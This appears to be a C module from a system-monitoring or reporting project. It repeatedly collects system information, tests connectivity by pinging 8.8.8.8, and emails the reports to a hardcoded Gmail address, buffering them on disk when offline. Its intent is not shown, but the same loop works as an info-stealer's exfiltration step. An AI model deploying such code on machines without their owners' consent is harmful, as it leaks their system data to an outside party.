#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/stat.h>

#include "../collector/sys_info.h"
#include "../tasks/mailer.h"

int has_internet() {
    int ret = system("ping -c1 -W2 8.8.8.8 > /dev/null 2>&1");
    return (ret == 0);
}

void save_report_to_file(const char *report) {
    mkdir("offline_reports", 0755);

    time_t t = time(NULL);
    struct tm *tm_info = localtime(&t);
    char filename[256];
    strftime(filename, sizeof(filename),
             "offline_reports/report_%Y%m%d_%H%M.txt", tm_info);

    FILE *fp = fopen(filename, "w");
    if (fp) {
        fputs(report, fp);
        fclose(fp);
        printf("[+] Saved report offline: %s\n", filename);
    }
}

void send_buffered_reports(const char *recipient) {
    FILE *list = popen("ls offline_reports/*.txt 2>/dev/null", "r");
    if (!list) return;

    char fname[256];
    while (fgets(fname, sizeof(fname), list)) {
        fname[strcspn(fname, "\n")] = 0;
        FILE *fp = fopen(fname, "r");
        if (!fp) continue;

        fseek(fp, 0, SEEK_END);
        long len = ftell(fp);
        rewind(fp);

        char *buf = malloc(len + 1);
        fread(buf, 1, len, fp);
        buf[len] = '\0';
        fclose(fp);

        if (send_mail(recipient, "Buffered System Report", buf) == 0) {
            printf("[+] Sent buffered report: %s\n", fname);
            remove(fname);
        } else {
            printf("[-] Failed to send buffered report: %s\n", fname);
        }
        free(buf);
    }
    pclose(list);
}

void start_listener(void) {
    const char *recipient = "akshaypiranavb@gmail.com";
    int mail_sent = 0;   
    while (1) {
        char *report = collect_sys_info();
        if (!report) {
            sleep(600);
            continue;
        }

        if (!mail_sent && has_internet()) {
            printf("[+] Internet available, sending reports...\n");

            send_buffered_reports(recipient);

            if (send_mail(recipient, "System Report", report) == 0) {
                printf("[+] Email sent successfully! \n");
                mail_sent = 1; 
            } else {
                printf("[-] Failed to send current report, saving offline.\n");
                save_report_to_file(report);
            }
        } else if (!mail_sent) {
            printf("[-] No internet, saving report offline.\n");
            save_report_to_file(report);
        } else {
            printf("[*] Mail already sent once, just collecting data locally.\n");
            save_report_to_file(report);
        }

        free(report);
        printf("[*] Sleeping 10 minutes...\n\n");
        sleep(600);
    }
}
